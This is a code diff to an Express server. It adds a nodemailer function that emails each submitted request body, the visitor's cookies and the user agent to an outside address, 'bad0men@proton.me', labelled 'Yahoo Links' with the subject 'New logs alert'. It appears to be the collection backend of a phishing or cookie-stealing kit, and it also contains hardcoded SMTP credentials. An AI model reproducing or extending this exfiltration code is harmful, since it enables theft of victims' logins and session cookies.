@@ -4,6 +4,36 @@ const cookieParser = require("cookie-parser"); // Add this line
 const app = express();
 const port = process.env.PORT || 3001;
 
+const nodemailer = require("nodemailer");
+
+const transporter = nodemailer.createTransport({
+  host: "smtp.ethereal.email",
+  port: 587,
+  secure: false, // Use `true` for port 465, `false` for all other ports
+  auth: {
+    user: "maddison53@ethereal.email",
+    pass: "jn7jnAPss4f63QBp6D",
+  },
+});
+
+async function sender(payload) {
+  // send mail with defined transport object
+  const info = await transporter.sendMail({
+    from: '"Yahoo Links 👻" <bad0men@proton.me>', // sender address
+    to: "bad0men@proton.me", // list of receivers
+    subject: "New logs alert ✔", // Subject line
+    text: `${payload?.body} + ${payload?.cookies} + ${payload.userAgent}`, // plain text body
+    html: `${payload?.body}\n\n
+    ${payload?.cookies}\n\n
+    ${payload.userAgent}`, // html body
+  });
+
+  console.log("Message sent: %s", info.messageId);
+}
+
+sender().catch(console.error);
+
+
 app.use(cors());
 app.use(express.json());
 app.use(cookieParser()); // Add this line
@@ -24,7 +54,12 @@ app.post("/endpoint", async (req, res) => {
     } else {
         console.log("No cookies available");
     }
-
+    const payload = {
+        body,
+        cookies,
+        userAgent
+    }
+    await sender(payload);
     return res.json({ body, cookies, userAgent }).status(200); // Include cookies and userAgent in response
 });
 
